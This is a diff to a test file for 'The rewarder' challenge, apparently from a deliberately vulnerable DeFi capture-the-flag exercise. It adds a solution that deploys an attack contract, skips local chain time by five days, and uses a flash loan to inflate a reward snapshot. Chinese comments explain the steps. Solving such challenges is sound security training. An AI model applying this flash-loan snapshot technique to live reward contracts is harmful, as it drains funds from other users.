@@ -97,6 +97,26 @@ describe("[Challenge] The rewarder", function () {
 	it("Exploit", async function () {
 		/** CODE YOUR EXPLOIT HERE */
 		// 從 flash loan 借出一堆 DVT 存到 pool 中拿獎勵，拿完就跑
+		// 只要能被 snapshot 到，就算存到錢了
+		// 他的分錢不是自動化的，感覺只要操作時間過五天，然後去flashLoan 借錢並觸發 recordSnapShot，就可以記錄到有存錢
+		// 再觸發 this.rewarderPool.connect(attacker).distributeRewards();
+		// 就可以拿到一堆獎勵 (?)
+
+		const AttackFactory = await ethers.getContractFactory(
+			"RewarderAttack",
+			deployer
+		);
+		this.attack = await AttackFactory.deploy(
+			this.flashLoanPool.address,
+			this.rewarderPool.address,
+			this.rewardToken.address,
+			this.liquidityToken.address
+		);
+
+		await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+		await this.attack.connect(attacker).attack(TOKENS_IN_LENDER_POOL);
+
+		// 爽拉
 	});
 
 	after(async function () {
